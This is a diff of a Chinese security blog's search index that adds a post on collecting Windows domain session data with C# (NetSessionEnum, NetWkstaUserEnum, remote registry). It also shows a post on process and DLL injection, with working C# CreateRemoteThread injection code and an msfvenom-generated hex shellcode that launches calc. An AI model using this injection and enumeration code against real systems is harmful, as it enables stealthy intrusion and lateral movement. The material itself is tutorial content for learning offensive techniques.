@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[【域渗透】域内会话收集]]></title>
+    <url>%2F2019%2F10%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9F%9F%E5%86%85%E4%BC%9A%E8%AF%9D%E6%94%B6%E9%9B%86%2F</url>
+    <content type="text"><![CDATA[2018 年3月，BooldHound 发表了篇博文 SharpHound: Target Selection and API Usage 。这里面介绍了一些关于收集 BooldHound 所需信息的收集方法及所使用的 API。而本文主要介绍两个关于收集会话信息的 API及利用远程注册表的方法（翻译+补充），也是对【域渗透】获取域环境内用户登录信息 的一个补充。 0x00 前言使用过BooldHound 的朋友都知道，它所呈现出来非常多的信息，基本能满足日常信息收集所需的数据，但是之前使用的时候，就很惊讶，它们的会话关系数据来源是怎么来的，所幸后来官方给了解释。 0x01 会话收集BooldHound 公开了三种不同的查询计算机会话信息的方法，都是从检查 445 端口开始的。 1）、NetSessionEnum它不允许直接查询是谁登陆了此工作站，但是它允许查询是谁在访问此工作站的网络资源（例如文件共享）时所创建的网络会话，从而知道来自何处。当然这里最好的查询对象是域控 + 文件共享服务器。此函数不需要高权限。 该函数原型是： 它需要 9 个参数，我们只需了解其中的 5 个参数即可： servername：该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为NULL，则使用本地计算机。 UncClientName：该字符串指定要为其返回信息的计算机会话的名称。如果此参数为 NULL，则 NetSessionEnum 将返回服务器上所有计算机会话的信息。 username：该字符串指定要为其返回信息的用户的名称。如果此参数为 NULL，则 NetSessionEnum 将返回所有用户的信息。 level：指定数据的信息级别。 bufptr：指向接收数据的缓冲区的指针。此数据的格式取决于 level 参数的值。此缓冲区由系统分配，必须使用 NetApiBufferFree 函数释放 。请注意，即使函数因 ERROR_MORE_DATA 而失败，也必须释放缓冲区。 而此 API 的调用示例为： 12string server = "rcoil.me"nStatus = NetSessionEnum(server, null, null, 10, out Bufptr, -1, ref dwEntriesread, ref dwTotalentries, ref dwResume_handle); 其中，level 的数值为10，是唯一以未经身份验证的方式获取所需数据的级别。 它会返回如下内容： 1234sesi10_cname - 192.10.22.102sesi10_username - RcoIlsesi10_time - 0sesi10_idle_time - 0 关键源码如下： 12345678910111213141516171819202122232425262728293031323334353637/// &lt;summary&gt;/// 返回指定服务器的所有 SESSIONS。返回 SESSION_INFO_10 结构的数组。/// https://www.pinvoke.net/default.aspx/netapi32/NetSessionEnum.html/// &lt;/summary&gt;/// &lt;param name="server"&gt;默认所有域内机器，隐形目标：域控制器+共享服务器&lt;/param&gt;/// &lt;returns&gt;SESSION_INFO_10 STRUCTURE ARRAY&lt;/returns&gt;public static SESSION_INFO_10[] EnumSessions(string server)&#123; IntPtr Bufptr; int nStatus = 0; Int32 dwEntriesread = 0, dwTotalentries = 0, dwResume_handle = 0; Bufptr = (IntPtr)Marshal.SizeOf(typeof(SESSION_INFO_10)); SESSION_INFO_10[] results = new SESSION_INFO_10[0]; do &#123; nStatus = NetSessionEnum(server, null, null, 10, out Bufptr, -1, ref dwEntriesread, ref dwTotalentries, ref dwResume_handle); results = new SESSION_INFO_10[dwEntriesread]; if (nStatus == (int)NERR.ERROR_MORE_DATA || nStatus == (int)NERR.NERR_Success) &#123; Int32 p = Bufptr.ToInt32(); for (int i = 0; i &lt; dwEntriesread; i++) &#123; SESSION_INFO_10 si = (SESSION_INFO_10)Marshal.PtrToStructure(new IntPtr(p), typeof(SESSION_INFO_10)); results[i] = si; p += Marshal.SizeOf(typeof(SESSION_INFO_10)); &#125; //NetApiBufferFree(BufPtr); &#125; // 释放先前从进程的非托管内存分配的内存。 Marshal.FreeHGlobal(Bufptr); &#125; while (nStatus == (int)NERR.ERROR_MORE_DATA); return results;&#125; 2）、NetWkstaUserEnum该 NetWkstaUserEnum 功能可以列出当前登录到该工作站的所有用户的信息。此列表包括交互式、服务和批量登录。此函数需要主机的管理权限或这域管权限，适用于自检使用。 该函数原型是： 它需要 7个参数，我们只需了解其中的 3 个参数即可： servername：该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为NULL，则使用本地计算机。 level：指定数据的信息级别。 bufptr：指向接收数据的缓冲区的指针。此数据的格式取决于 level 参数的值。此缓冲区由系统分配，必须使用 NetApiBufferFree 函数释放 。请注意，即使函数因 ERROR_MORE_DATA 而失败，也必须释放缓冲区。 而此 API 的调用示例为： 12string server = "rcoil.me"nStatus = NetWkstaUserEnum(server, 1, out Bufptr, 32768, out dwEntriesread, out dwTotalentries, ref dwResumehandle); 其中，level 的数值为1，是因为 1 比 0 返回的数据多，因此选择了 1。 它会返回如下内容： 1234wkui1_username - Administratorwkui1_logon_domain - RDC_1wkui1_oth_domains -wkui1_logon_server - RCOIL 关键源码如下： 1234567891011121314151617181920212223242526272829303132333435363738/// &lt;summary&gt;/// API 调用的第二个参数是 API 调用的级别，其中 1 返回的数据多于 0，所以选择 1进行测试/// https://www.pinvoke.net/default.aspx/netapi32/netwkstauserenum.html/// &lt;/summary&gt;/// &lt;param name="server"&gt;默认所有域内机器，隐形目标：域控制器+共享服务器&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static WKSTA_USER_INFO_1[] EnumWkstaUser(string server)&#123; IntPtr Bufptr; int nStatus = 0; Int32 dwEntriesread = 0, dwTotalentries = 0, dwResumehandle = 0; Bufptr = (IntPtr)Marshal.SizeOf(typeof(WKSTA_USER_INFO_1)); WKSTA_USER_INFO_1[] results = new WKSTA_USER_INFO_1[0]; do &#123; nStatus = NetWkstaUserEnum(server, 1, out Bufptr, 32768, out dwEntriesread, out dwTotalentries, ref dwResumehandle); results = new WKSTA_USER_INFO_1[dwEntriesread]; if ((nStatus == NERR_SUCCESS) || (nStatus == ERROR_MORE_DATA)) &#123; if (dwEntriesread &gt; 0) &#123; IntPtr pstruct = Bufptr; for (int i = 0; i &lt; dwEntriesread; i++) &#123; WKSTA_USER_INFO_1 wui1 = (WKSTA_USER_INFO_1)Marshal.PtrToStructure(pstruct, typeof(WKSTA_USER_INFO_1)); results[i] = wui1; pstruct = (IntPtr)((int)pstruct + Marshal.SizeOf(typeof(WKSTA_USER_INFO_1))); &#125; &#125; &#125; if (Bufptr != IntPtr.Zero) NetApiBufferFree(Bufptr); &#125; while (nStatus == ERROR_MORE_DATA); return results;&#125; 3）、远程注册表此方法仅为辅助启用。尝试打开远程注册表的用户配置单元（如果已启用），并将查找与 SID 格式匹配的子项，这些对应于登录用户将获取的 SID 转换成用户名即可。一般来说，需要域管权限去操作，而在极少数情况下，无需管理员权限即可访问此数据，这个得看脸。 此处使用 OpenRemoteBaseKey() 函数。 它需要 2 个参数： RegistryHive：来自 RegistryHive 的枚举。这里选择 Users，表示 HKEY_USERS。 string：表示远程主机。 此函数的调用示例为： 1var key = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, server); 它会返回如下内容： 1HKEY_USERS 然后读取 HKEY_USERS 的键项就可以了。关键源码如下： 1234567891011121314151617181920212223242526272829303132/// &lt;summary&gt;/// 利用 OpenRemoteBaseKey 读取 HKEY_USERS 的键项/// &lt;/summary&gt;/// &lt;param name="server"&gt;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;private static IEnumerable&lt;string&gt; GetRegistryLoggedOn(string server)&#123; var users = new List&lt;string&gt;(); try &#123; // 远程打开注册表配置单元，如果它不是我们当前的配置单元 RegistryKey key = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, server); // 找到与我们的正则表达式匹配的所有子项 var filtered = key.GetSubKeyNames().Where(sub =&gt; SidRegex.IsMatch(sub)); foreach (var subkey in filtered) &#123; users.Add(subkey); &#125; &#125; catch (Exception) &#123; yield break; &#125; foreach (var user in users.Distinct()) &#123; yield return user; &#125;&#125; 最后将 用户的SID 转成用户名即可。 1string Username = new SecurityIdentifier(regSID).Translate(typeof(NTAccount)).ToString(); 4）、结果 0x02 备忘录 API 调用 协议 端口 RPC 接口 UUID 命名管道 RPC 方法 NetSessionEnum.aspx) [MS-SRVS]: Server Service Remote Protocol TCP 445 4B324FC8-1670-01D3-1278-5A47BF6EE188 \PIPE\srvsvc NetrSessionEnum NetWkstaUserEnum.aspx) [MS-WKST]: Workstation Service Remote Protocol TCP 445 6BFFD098-A112-3610-9833-46C3F87E345A \PIPE\wkssvc NetrWkstaUserEnum Github 项目地址：SharpDomainSession ，此项目仅供实验使用 Demo。如想更进一步利用，可移至 SharpHound]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>C#</tag>
+        <tag>Tools</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[进程注入-第一部分]]></title>
     <url>%2F2019%2F09%2F%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%2F</url>
     <content type="text"><![CDATA[通过 CreateRemoteThread API 进行代码与 DLL 注入。 0x00 前言某日看到收藏夹里头的 Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques ，里头总结得很到位，在国内的几个流行的安全媒体上也见过译文。 通过对进程注入技术的学习和理解，个人觉得整个过程非常有趣，故以此作为 C# 代码学习的方向（Windows API 利用），并编写有助于学习和开发的代码。 注意： 我不是第一个编写这样代码的人，Github 有一大堆代码示例。 0x01 什么是进程注入进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。尽管有非常多的进程注入技术，本文所述是最常用的进程注入技术之一。 0x02 VirtualAllocEx =&gt; WriteProcessMemory 模式CreateRemoteThread 是 Win32 API 提供的一个函数，用于在另一个进程中创建线程。在另一个应用程序中创建线程之前，必须满足两个条件。 尝试在另一个进程中创建线程的进程必须具有创建线程的权限。简单来说，必须有与目标进程相同或更高的权限（目标指的是我们想要创建线程的进程） 两个进程必须在同一会话中。如果会话标识符不匹配，则不会创建线程。 如果不满足上述任何一个条件，则操作系统本身将拒绝代码注入这一过程。这不是 Windows 操作系统体系结构中的安全漏洞，而是由操作系统提供的功能。由于我们无法修改具有比我们更高权限的进程，因此不会跨越任何安全边界。 为了通过 CreateRemoteThread API 实现代码注入，我们遵循以下流程： 代码示意： 123456789101112131415161718192021222324252627282930313233public static void CodeInject(int pid, byte[] buf)&#123; try &#123; uint lpNumberOfBytesWritten = 0; uint lpThreadId = 0; Console.WriteLine($" [&gt;] 获取进程ID &#123;pid&#125; 的句柄."); IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid); Console.WriteLine($" [&gt;] 打开进程id &#123; pid &#125; 的句柄 &#123;pHandle&#125;."); Console.WriteLine($" [&gt;] 分配内存以注入shellcode."); IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE); Console.WriteLine($" [&gt;] Shellcode 的内存分配在 0x&#123;rMemAddress&#125;."); Console.WriteLine($" [&gt;] 在已分配的内存位置写入shellcode"); if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten)) &#123; Console.WriteLine($" [&gt;] Shellcode写在进程内存中."); Console.WriteLine($" [&gt;] 创建远程线程来注入 shellcode."); IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId); bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread); Console.WriteLine($" [&gt;] 成功将 shellcode 注入进程id &#123;pid&#125; 的内存中."); &#125; else &#123; Console.WriteLine($" [!] 无法将shellcode注入进程id &#123;pid&#125; 的内存中."); &#125; bool hOpenProcessClose = CloseHandle(pHandle); &#125; catch (Exception ex) &#123; Console.WriteLine("[+] " + Marshal.GetExceptionCode()); Console.WriteLine(ex.Message); &#125;&#125; Cobalt Strike 提供了两种在远程进程中分配内存并将数据复制到其中的选项，而其中默认使用项就是使用了 VirtualAllocEx -&gt; WriteProcessMemory 的经典模式，这模式也是红队工具中最常见的模式。此模式也适用于不同的进程体系结构。 当然，一个好的实现需要考虑到出现不同的极端情况，比如 x86 -&gt; x64， x64 -&gt; x86，不同上下文等，不过这不是本文的内容。 0x03 深入了解函数3.1 访问远程进程要对任何进程执行内存操作，我们必须能够访问到它。可以通过使用 OpenProcess 函数获得，该函数原型是： 它需要 3 个参数： DwDesiredAccess：对进程对象的请求访问权限。它将根据受害者进程的安全描述符进行检查。如果调用者启用了 SeDebugPrivilege 特权，则无论安全描述符的内容如何，都会授予所请求的访问权限。 bInheritHandle：如果此值为 TRUE，则此进程创建的进程将继承该句柄。否则，进程不会继承此句柄。 dwProcessId：这是受害者进程的进程标识符。 如果函数成功，则返回值是指定进程的打开句柄，其他 API函数可以使用它来操作受害进程的内存。失败时，返回 NULL。 3.2 为 shellcode 分配空间一旦我们获得进程的句柄，我们继续为内存中的 shellcode 分配空间。这是通过使用 VirtualAllocEx API 调用完成的。 它需要 5 个参数： hProcess：进程的句柄。该函数在此进程的虚拟地址空间内分配内存。句柄必须具有PROCESS_VM_OPERATION访问权限。 lpAddress：指向受害者进程内存中指定地址的指针。如果参数指定为 NULL，则该函数回自动选择要分配的内存页面。 dwSize：要分配的内存区域的大小，它以字节为单位。 flAllocationType：指定要分配的内存类型。此参数必须包含以下值之一。：MEM_COMMIT、MEM_RESERVE、MEM_RESET、MEM_RESET_UNDO。 flProtect：要分配的页面区域的内存保护。出于我们的目的，它将包含我们要执行的代码，并且我们希望它可读可写，我们将其设置为 PAGE_EXECUTE_READWRITE。 该函数在成功时返回分配的基址，而失败时，返回 NULL。 此时我们已经成功设法在进程中分配可执行内存。 3.3 在远程进程中写入 shellcode现在，我们需要在分配的区域中写入 shellcode。为此，我们有一个名为 WriteProcessMemory 的函数。 WriteProcessMemory 是一个函数，它将调用者的数据写入指定进程的内存区域。需要注意的时整个内存区域必须时可写的，否则函数会失败，这就是为什么我们要将内存分配为可写，并与可读和可执行文件一起分配。 它需要 5 个参数。 hProcess：要修改的进程内存的句柄。句柄必须具有 PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION 访问权限。 lpBaseAddress：指向写入数据的指定进程中的基址的指针（我们想要写入数据的地址）。在发生数据传输之前，系统会验证指定大小的基址和内存中的所有数据是否都可以进行写访问，如果无法访问，则该函数将失败。 lpBuffer：指向缓冲区的指针，指针补习时const指针。该缓冲区包含要在指定进程的地址空间中写入的数据。 nSize：要写入指定进程的字节数。 lpNumberOfBytesWritten：指向变量的指针，该变量接收传输到指定进程的字节数。此参数是可选的。如果 lpNumberOfBytesWritten 为 NULL，则忽略该参数。 如果函数由于某些原因而失败，则返回 false，如果成功则返回 true。 此时，stage 已全部设置，所需的只是在远程进程中创建一个线程并运行它。 3.4 执行 shellcode为了在远程进程中创建线程，我们使用 Win32 API 提供的 CreateRemoteThread 函数。 它需要 7 个参数，其中只有 3 个是我们感兴趣的。其余的可以通过调整它们获得默认值，可以对新创建的线程进行更多控制。 我们感兴趣的参数是： hProcess：要创建线程的进程的句柄。 lpStartAddress：它是指向 THREADSTARTROUTINE 的指针，THREADSTARTROUTINE 是线程创建后开始执行代码的位置。 lpParameter：指向 LPTHREAD_START_ROUTINE 所需参数的指针。因为在这种情况下，它是一个普通的shellcode，它不期望任何参数，因此，我们将它保持为 NULL 。此参数在 DLL 注入中具有价值。 0x04 演示利用 msfvenom 生成 shellcode 123456789101112rcoil@MacBookPro  ~  msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f hex[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadFound 3 compatible encodersAttempting to encode payload with 1 iterations of generic/nonegeneric/none failed with Encoding failed due to a bad character (index=7, char=0x00)Attempting to encode payload with 1 iterations of x64/xorx64/xor succeeded with size 311 (iteration=0)x64/xor chosen with final size 311Payload size: 311 bytesFinal size of hex file: 622 bytes4831c94881e9deffffff488d05efffffff48bbc690bbfdf6dbd2a448315827482df8ffffffe2f43ad83819063312a4c690faacb78b80f590d88a2f939359f6a6d830afee9359f6e6d8308fa693dd138cdaf6cc3f93e3646aacda81f4f7f2e50759b6bcf71a304994d1eab57d89f22f84acf3fc2650522cc690bbb5731ba6c38e916bad7d93cae04dd09bb4f70b31f28e6f72bc7def5aecc746f6cc3f93e3646ad17a34fb9ad365fe70ce0cbad89e80ced5822c83038ae04dd09fb4f70bb4e54d9cf3b97d9bceedc740fa76f2539aa516d1e3bcae858bfe87c8faa4b7819a272ab0faaf093b8ae59fcaf376e432855b396fe6b54cdad2a4c690bbfdf6935f29c791bbfdb761e32fa91744284d3bcf8eccd1015b63664f5b13d83839dee7d4d8cc10401d83de69e3d5e2d497f682932d1c6f6e9e97b7b1a4 运行结果： 0x05 DLL 注入5.1 什么是DLL？动态链接库（DLL）是一个包含代码的文件，程序已加载该文件以在运行时执行一个或多个操作。 5.2 什么是DLL注入？DLL 注入是一个将 DLL 注入到正在运行中的进程的过程，该进程可能包含恶意代码，可用于执行恶意活动。 5.3 相关函数 GetModuleHandleA ：检索已由调用进程加载的指定模块的模块句柄。 GetProcAddress ：从指定的动态链接库（DLL）中检索导出的函数或变量的地址。 5.4 示例代码DLL 注入，只需要在上面的基础上引入 LoadLibrary 即可。 代码部分只需要修改以下内容即可 1234567891011121314151617181920212223242526272829303132333435public static void DLLInject(int pid, byte[] buf)&#123; try &#123; uint lpNumberOfBytesWritten = 0; uint lpThreadId = 0; Console.WriteLine($" [&gt;] 获取进程ID &#123;pid&#125; 的句柄."); IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid); Console.WriteLine($" [&gt;] 打开进程id &#123; pid &#125; 的句柄 &#123;pHandle&#125;."); IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"); Console.WriteLine($" [&gt;] LoadLibraryA 的导出函数地址是 &#123;loadLibraryAddr&#125; ."); Console.WriteLine($" [&gt;] 分配 DLL 路径的内存."); IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE); Console.WriteLine($" [&gt;] 注入 DLL 路径的内存分配在 0x&#123;rMemAddress&#125;."); Console.WriteLine($" [&gt;] 在已分配的内存位置写入 DLL 路径."); if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten)) &#123; Console.WriteLine($" [&gt;] DLL 路径写在目标进程内存中."); Console.WriteLine($" [&gt;] 创建远程线程来注入 DLL."); IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, loadLibraryAddr, rMemAddress, 0, ref lpThreadId); bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread); Console.WriteLine($"[&gt;] 成功将 DLL 注入进程id &#123;pid&#125; 的内存中."); &#125; else &#123; Console.WriteLine($" [!] 无法将 DLL 注入进程id &#123;pid&#125; 的内存中."); &#125; bool hOpenProcessClose = CloseHandle(pHandle); &#125; catch (Exception ex) &#123; Console.WriteLine("[+] " + Marshal.GetExceptionCode()); Console.WriteLine(ex.Message); &#125;&#125; 0x06 来源参考https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.htmlhttps://pwnrip.com/demystifying-code-injection-techniques-part-1-shellcode-injection/https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/]]></content>
@@ -8,8 +21,8 @@
         <category>编程之道</category>
       </categories>
       <tags>
-        <tag>Tools</tag>
         <tag>C#</tag>
+        <tag>Tools</tag>
         <tag>权限维持</tag>
       </tags>
   </entry>
@@ -163,8 +176,8 @@
         <category>编程之道</category>
       </categories>
       <tags>
-        <tag>Tools</tag>
         <tag>C#</tag>
+        <tag>Tools</tag>
         <tag>域渗透</tag>
       </tags>
   </entry>
@@ -224,8 +237,8 @@
         <category>Tools</category>
       </categories>
       <tags>
-        <tag>Tools</tag>
         <tag>内网渗透</tag>
+        <tag>Tools</tag>
       </tags>
   </entry>
   <entry>
@@ -258,8 +271,8 @@
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>Web安全</tag>
         <tag>PHP</tag>
+        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -349,9 +362,9 @@
         <category>内网渗透</category>
       </categories>
       <tags>
-        <tag>Web安全</tag>
         <tag>内网</tag>
         <tag>系统安全</tag>
+        <tag>Web安全</tag>
         <tag>后门</tag>
       </tags>
   </entry>
@@ -388,8 +401,8 @@
         <category>编程之道</category>
       </categories>
       <tags>
-        <tag>Web安全</tag>
         <tag>PHP</tag>
+        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
